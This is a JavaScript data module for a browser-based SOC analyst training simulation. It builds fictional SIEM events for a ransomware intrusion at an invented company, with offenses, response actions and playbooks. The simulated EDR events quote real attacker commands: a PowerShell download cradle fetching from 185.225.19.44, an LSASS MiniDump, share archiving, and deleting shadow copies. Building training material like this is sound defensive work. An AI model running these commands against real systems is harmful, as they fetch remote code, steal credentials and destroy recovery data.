/* ==========================================================================
   Raqib SIEM — data layer for the SOC Analyst Simulation
   "Raqib" (رقيب) means "watcher/monitor". This module builds a self-consistent
   set of security events for a single shift at a fictional company, GulfPay,
   plus the offenses (correlated incidents) a SIEM would raise from them.

   Everything here is generated in the browser. There is no backend; times are
   anchored to "shift start" so the console always looks live.
   ========================================================================== */
(function (global) {
    'use strict';

    const ORG = {
        name: 'GulfPay',
        domain: 'gulfpay.local',
        analyst: 'a.alghamdi',
        shiftStartHour: 8
    };

    const HOSTS = {
        'FIN-WS03': { ip: '10.20.14.53', user: 'j.harbi', dept: 'Finance', os: 'Windows 11 23H2', role: 'Workstation' },
        'FIN-WS07': { ip: '10.20.14.57', user: 'n.otaibi', dept: 'Finance', os: 'Windows 11 23H2', role: 'Workstation' },
        'HR-WS02': { ip: '10.20.16.22', user: 's.dosari', dept: 'HR', os: 'Windows 11 23H2', role: 'Workstation' },
        'FILE-SRV01': { ip: '10.20.8.10', user: 'SYSTEM', dept: 'IT', os: 'Windows Server 2022', role: 'File server' },
        'DC01': { ip: '10.20.8.2', user: 'SYSTEM', dept: 'IT', os: 'Windows Server 2022', role: 'Domain controller' },
        'VPN-GW': { ip: '10.20.0.1', user: '-', dept: 'IT', os: 'PAN-OS', role: 'VPN gateway' },
        'WEB-DMZ01': { ip: '172.16.3.10', user: 'www-data', dept: 'IT', os: 'Ubuntu 22.04', role: 'Web server' }
    };

    const EXTERNAL = {
        c2: '185.225.19.44',
        exfil: '91.219.236.18',
        spray: '45.155.205.233',
        scanner: '10.10.5.20'
    };

    let seed = 1337;
    function rand() { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; }
    function pick(a) { return a[Math.floor(rand() * a.length)]; }

    const shiftStart = new Date();
    shiftStart.setHours(ORG.shiftStartHour, 0, 0, 0);
    if (Date.now() < shiftStart.getTime()) shiftStart.setDate(shiftStart.getDate() - 1);
    const at = (m) => new Date(shiftStart.getTime() + m * 60000);

    let uid = 0;
    const ev = (o) => Object.assign({ _id: 'e' + (++uid) }, o);

    /* ---- the storyline: a finance-department ransomware intrusion ---- */
    const STORY = [];
    const S = (min, host, o) => STORY.push(ev(Object.assign({
        time: at(min), host: host, ip: HOSTS[host] ? HOSTS[host].ip : '', user: HOSTS[host] ? HOSTS[host].user : '', chain: true
    }, o)));

    S(6,  'FIN-WS03', { source: 'email', action: 'delivered', signature: 'Inbound email with macro attachment', severity: 'low',
        msg: 'Email "Invoice_Q2_OVERDUE.docm" from billing@gulfpay-invoices.com delivered to j.harbi@gulfpay.local', extra: { sender: 'billing@gulfpay-invoices.com', attachment: 'Invoice_Q2_OVERDUE.docm', spf: 'fail' } });
    S(9,  'FIN-WS03', { source: 'edr', action: 'process', signature: 'Office application spawned scripting engine', severity: 'high',
        msg: 'WINWORD.EXE spawned powershell.exe with encoded command', extra: { parent: 'WINWORD.EXE', process: 'powershell.exe', cmdline: 'powershell -nop -w hidden -enc SQBFAFgAKA...' }, technique: 'T1566.001' });
    S(10, 'FIN-WS03', { source: 'edr', action: 'process', signature: 'Encoded PowerShell download cradle', severity: 'high',
        msg: 'powershell.exe decoded to IEX (New-Object Net.WebClient).DownloadString("http://185.225.19.44/a")', extra: { process: 'powershell.exe', cmdline: 'IEX (New-Object Net.WebClient).DownloadString("http://185.225.19.44/a")' }, technique: 'T1059.001' });
    S(11, 'FIN-WS03', { source: 'firewall', action: 'allow', signature: 'Outbound connection to new external host', severity: 'medium',
        msg: 'Allowed 10.20.14.53 -> 185.225.19.44:443 (uncategorized)', extra: { dst: EXTERNAL.c2, dport: 443, bytes: 2140 } });
    S(14, 'FIN-WS03', { source: 'ids', action: 'alert', signature: 'ET MALWARE Cobalt Strike beacon (HTTPS)', severity: 'critical',
        msg: 'Beacon pattern to 185.225.19.44 every 60s from 10.20.14.53', extra: { dst: EXTERNAL.c2 }, technique: 'T1071.001' });
    S(22, 'FIN-WS03', { source: 'edr', action: 'process', signature: 'Credential dumping behavior (LSASS access)', severity: 'critical',
        msg: 'Suspicious handle to lsass.exe by rundll32.exe (comsvcs.dll MiniDump)', extra: { process: 'rundll32.exe', cmdline: 'rundll32 comsvcs.dll MiniDump 656 lsass.dmp full' }, technique: 'T1003.001' });
    S(34, 'DC01',     { source: 'auth', action: 'success', signature: 'Service account TGT off-hours', severity: 'high',
        msg: 'svc_backup authenticated from 10.20.14.53 (first time from this host)', extra: { account: 'svc_backup', logon_type: 3, src: HOSTS['FIN-WS03'].ip }, technique: 'T1550' });
    S(41, 'FILE-SRV01', { source: 'auth', action: 'success', signature: 'Remote logon with service account', severity: 'high',
        msg: 'svc_backup logged on to FILE-SRV01 via SMB from 10.20.14.53', extra: { account: 'svc_backup', logon_type: 3, src: HOSTS['FIN-WS03'].ip }, technique: 'T1021.002' });
    S(45, 'FILE-SRV01', { source: 'edr', action: 'process', signature: 'Archive utility run on file share', severity: 'medium',
        msg: '7z.exe archiving \\\\FILE-SRV01\\Finance\\* to C:\\Windows\\Temp\\fin.7z', extra: { process: '7z.exe', cmdline: '7z a -mx1 C:\\Windows\\Temp\\fin.7z \\\\FILE-SRV01\\Finance\\*' }, technique: 'T1560.001' });
    S(52, 'FILE-SRV01', { source: 'firewall', action: 'allow', signature: 'Large outbound transfer to external host', severity: 'critical',
        msg: '2.6 GB uploaded 10.20.8.10 -> 91.219.236.18:443', extra: { dst: EXTERNAL.exfil, dport: 443, bytes: 2684354560 }, technique: 'T1041' });
    S(58, 'FIN-WS03', { source: 'edr', action: 'process', signature: 'Volume shadow copies deleted', severity: 'critical',
        msg: 'vssadmin.exe delete shadows /all /quiet executed on FIN-WS03', extra: { process: 'vssadmin.exe', cmdline: 'vssadmin delete shadows /all /quiet' }, technique: 'T1490' });
    S(61, 'FIN-WS03', { source: 'edr', action: 'alert', signature: 'Mass file modification consistent with ransomware', severity: 'critical',
        msg: '1,240 files renamed to *.gpay in C:\\Users\\j.harbi within 40s; ransom note RECOVER_FILES.txt written', extra: { extension: '.gpay', note: 'RECOVER_FILES.txt' }, technique: 'T1486' });

    /* ---- background noise + two decoy offenses ----------------------- */
    const NOISE = [];
    const N = (min, host, o) => NOISE.push(ev(Object.assign({ time: at(min), host: host, ip: HOSTS[host] ? HOSTS[host].ip : '', user: HOSTS[host] ? HOSTS[host].user : '', chain: false }, o)));

    for (let i = 0; i < 40; i++) {
        const h = pick(['FIN-WS07', 'HR-WS02', 'FIN-WS03']);
        N(Math.floor(rand() * 240), h, { source: 'auth', action: 'success', signature: 'Interactive logon', severity: 'info',
            msg: HOSTS[h].user + ' logged on to ' + h, extra: { logon_type: 2 } });
    }
    for (let i = 0; i < 30; i++) {
        N(Math.floor(rand() * 240), 'WEB-DMZ01', { source: 'web', action: 'allow', signature: 'HTTP request', severity: 'info',
            msg: 'GET /api/health 200 from ' + (Math.floor(rand() * 200) + 20) + '.12.44.' + Math.floor(rand() * 200), extra: { status: 200 } });
    }
    N(30, 'FIN-WS07', { source: 'ids', action: 'alert', signature: 'Internal port scan detected', severity: 'medium',
        msg: 'Host 10.10.5.20 scanned 10.20.14.0/24 (authorized scanner)', extra: { src: EXTERNAL.scanner } });
    for (let i = 0; i < 38; i++) {
        N(18 + Math.floor(rand() * 6), 'VPN-GW', { source: 'auth', action: 'failure', signature: 'VPN authentication failed', severity: 'medium',
            msg: 'Failed VPN login for ' + pick(['admin', 'test', 'a.harbi', 's.dosari', 'root', 'helpdesk']) + ' from 45.155.205.233', extra: { src: EXTERNAL.spray, sprayGroup: true } });
    }
    N(70, 'WEB-DMZ01', { source: 'web', action: 'alert', signature: 'TLS certificate expiring', severity: 'low',
        msg: 'Certificate for pay.gulfpay.com expires in 6 days', extra: {} });
    N(88, 'FILE-SRV01', { source: 'firewall', action: 'alert', signature: 'Cleartext protocol on internal network', severity: 'low',
        msg: 'FTP (cleartext) observed 10.20.16.22 -> 10.20.8.10', extra: {} });
    for (let i = 0; i < 6; i++) {
        N(Math.floor(rand() * 240), pick(['HR-WS02', 'FIN-WS07']), { source: 'edr', action: 'quarantine', signature: 'PUA quarantined', severity: 'low',
            msg: 'Potentially unwanted app quarantined (' + pick(['Toolbar', 'DriverUpdater', 'CouponHelper']) + ')', extra: {} });
    }

    const LOGS = STORY.concat(NOISE).sort((a, b) => a.time - b.time);

    const chainIds = STORY.map((e) => e._id);
    const sprayIds = NOISE.filter((e) => e.extra && e.extra.sprayGroup).map((e) => e._id);

    const OFFENSES = [
        {
            id: 'OF-1042', title: 'Ransomware kill chain on FIN-WS03', severity: 'critical', status: 'open',
            category: 'Malware / Ransomware', firstSeen: at(6), lastSeen: at(61),
            sourceHost: 'FIN-WS03', sourceUser: 'j.harbi', magnitude: 9.4, eventIds: chainIds,
            techniques: ['T1566.001', 'T1059.001', 'T1071.001', 'T1003.001', 'T1021.002', 'T1560.001', 'T1041', 'T1490', 'T1486'],
            summary: 'A malicious macro on FIN-WS03 led to a Cobalt Strike beacon, credential theft, lateral movement to FILE-SRV01, 2.6 GB of finance data exfiltrated, shadow copies deleted and file encryption starting. This is an active, high-impact intrusion.',
            recommended: ['isolate_host', 'block_c2', 'disable_account', 'block_exfil', 'escalate'],
            available: ['isolate_host', 'block_c2', 'block_exfil', 'disable_account', 'reset_creds', 'collect_forensics', 'escalate'],
            playbook: 'ransomware'
        },
        {
            id: 'OF-1043', title: 'VPN password spray from 45.155.205.233', severity: 'high', status: 'open',
            category: 'Credential Access', firstSeen: at(18), lastSeen: at(24),
            sourceHost: 'VPN-GW', sourceUser: '-', magnitude: 6.1, eventIds: sprayIds,
            techniques: ['T1110.003'],
            summary: '38 failed VPN logins against 6 accounts from a single external IP in a short window, with no success. A password-spray attempt that has not yet broken in.',
            recommended: ['block_source', 'notify_users', 'escalate'],
            available: ['block_source', 'notify_users', 'reset_creds', 'collect_forensics', 'escalate'],
            playbook: 'bruteforce'
        },
        {
            id: 'OF-1044', title: 'TLS certificate for api.gulfpay.com expiring', severity: 'low', status: 'open',
            category: 'Hygiene', firstSeen: at(70), lastSeen: at(70),
            sourceHost: 'WEB-DMZ01', sourceUser: 'www-data', magnitude: 2.0,
            eventIds: NOISE.filter((e) => e.signature === 'TLS certificate expiring').map((e) => e._id),
            techniques: [],
            summary: 'The TLS certificate for api.gulfpay.com expires in 6 days and auto-renew is disabled. This is not an attack, but if it lapses the API and every downstream integration break. Renew it and put monitoring in place.',
            cert: { domain: 'api.gulfpay.com', expiry: 'in 6 days', issuer: "Let's Encrypt / R3", type: 'DV (Domain Validated)', autorenew: 'Disabled' },
            recommended: ['renew_cert', 'enable_autorenew', 'add_monitoring'],
            available: ['renew_cert', 'enable_autorenew', 'add_monitoring', 'ticket'],
            playbook: 'cert'
        }
    ];

    const ACTIONS = {
        isolate_host: { label: 'Isolate host from network', icon: 'fa-network-wired', kind: 'contain', ok: 'FIN-WS03 isolated. Beacon and encryption traffic cut off.' },
        block_c2: { label: 'Block C2 IP at firewall', icon: 'fa-ban', kind: 'contain', ok: '185.225.19.44 blocked outbound at the perimeter.' },
        block_exfil: { label: 'Block exfil IP at firewall', icon: 'fa-ban', kind: 'contain', ok: '91.219.236.18 blocked. No further data can leave.' },
        block_source: { label: 'Block source IP at VPN', icon: 'fa-ban', kind: 'contain', ok: '45.155.205.233 blocked at the VPN gateway.' },
        disable_account: { label: 'Disable compromised account', icon: 'fa-user-lock', kind: 'eradicate', ok: 'svc_backup disabled and sessions revoked.' },
        reset_creds: { label: 'Force credential reset', icon: 'fa-key', kind: 'eradicate', ok: 'Password reset forced for affected accounts.' },
        notify_users: { label: 'Notify affected users', icon: 'fa-envelope', kind: 'notify', ok: 'Owners of the sprayed accounts notified to watch for prompts.' },
        ticket: { label: 'Raise a hygiene ticket', icon: 'fa-ticket', kind: 'notify', ok: 'Ticket routed to the platform team.' },
        escalate: { label: 'Escalate to IR / Tier 2', icon: 'fa-arrow-up-right-dots', kind: 'escalate', ok: 'Incident response team paged with the timeline.' },
        collect_forensics: { label: 'Collect forensic triage', icon: 'fa-microscope', kind: 'investigate', ok: 'Memory and disk triage collected from FIN-WS03.' },
        renew_cert: { label: 'Renew the TLS certificate', icon: 'fa-certificate', kind: 'remediate', ok: 'Certificate for api.gulfpay.com renewed and deployed.' },
        enable_autorenew: { label: 'Enable auto-renewal (certbot)', icon: 'fa-rotate', kind: 'remediate', ok: 'Auto-renewal enabled so this will not recur.' },
        add_monitoring: { label: 'Add expiry monitoring (30/7 day)', icon: 'fa-bell', kind: 'notify', ok: 'Expiry alerts set for 30 and 7 days out.' },
        close: { label: 'Close offense', icon: 'fa-check', kind: 'close', ok: 'Offense closed.' }
    };

    const FIELDS = ['source', 'action', 'severity', 'host', 'ip', 'user', 'signature', 'technique'];

    const PLAYBOOKS = {
        ransomware: {
            name: 'Ransomware response', category: 'Malware',
            steps: [
                'Isolate the affected host from the network to stop encryption and lateral movement.',
                'Block the command-and-control and exfiltration IPs at the perimeter.',
                'Disable any accounts used by the attacker and revoke active sessions.',
                'Collect volatile evidence (memory, running processes) before powering off.',
                'Identify scope: which shares, hosts and data were touched.',
                'Escalate to the incident response team and notify stakeholders per policy.',
                'Restore from known-good backups once the environment is clean.'
            ]
        },
        cert: {
            name: 'Certificate lifecycle', category: 'Hygiene',
            steps: [
                'Confirm the certificate, its expiry date and every service that presents it.',
                'Renew and deploy the certificate before it expires.',
                'Enable automated renewal (certbot or the platform equivalent).',
                'Verify downstream integrations still trust the new certificate.',
                'Add expiry monitoring at 30 and 7 days to prevent recurrence.'
            ]
        },
        bruteforce: {
            name: 'Brute force / password spray', category: 'Authentication',
            steps: [
                'Confirm whether any login succeeded from the source.',
                'Block the source IP at the gateway.',
                'Notify targeted account owners and force resets if a success is found.',
                'Review MFA coverage and lockout thresholds.',
                'Add the indicator to the watchlist and monitor for return.'
            ]
        }
    };

    const REFERENCE_PLAYBOOKS = [
        { name: 'Ransomware Response', category: 'Malware', updated: 'Apr 25, 2025', status: 'active' },
        { name: 'Phishing Investigation', category: 'Email Security', updated: 'Apr 22, 2025', status: 'active' },
        { name: 'Data Exfiltration Response', category: 'Data Loss Prevention', updated: 'Apr 15, 2025', status: 'active' },
        { name: 'Brute Force / Password Spray', category: 'Authentication', updated: 'Apr 10, 2025', status: 'active' },
        { name: 'Insider Threat Investigation', category: 'User Activity', updated: 'Apr 05, 2025', status: 'active' },
        { name: 'Cloud Account Compromise', category: 'Cloud Security', updated: 'Mar 28, 2025', status: 'active' },
        { name: 'Business Email Compromise', category: 'Email Security', updated: 'Mar 20, 2025', status: 'active' },
        { name: 'Malware Analysis', category: 'Malware', updated: 'Mar 10, 2025', status: 'active' }
    ];

    const TECHNIQUES = {
        'T1566.001': 'Phishing: Spearphishing Attachment',
        'T1059.001': 'Command and Scripting Interpreter: PowerShell',
        'T1071.001': 'Application Layer Protocol: Web Protocols',
        'T1003.001': 'OS Credential Dumping: LSASS Memory',
        'T1021.002': 'Remote Services: SMB / Windows Admin Shares',
        'T1550': 'Use Alternate Authentication Material',
        'T1560.001': 'Archive Collected Data: via Utility',
        'T1041': 'Exfiltration Over C2 Channel',
        'T1490': 'Inhibit System Recovery',
        'T1486': 'Data Encrypted for Impact',
        'T1110.003': 'Brute Force: Password Spraying'
    };

    global.SOC = { ORG, HOSTS, EXTERNAL, LOGS, OFFENSES, ACTIONS, FIELDS, PLAYBOOKS, REFERENCE_PLAYBOOKS, TECHNIQUES, shiftStart };
})(window);
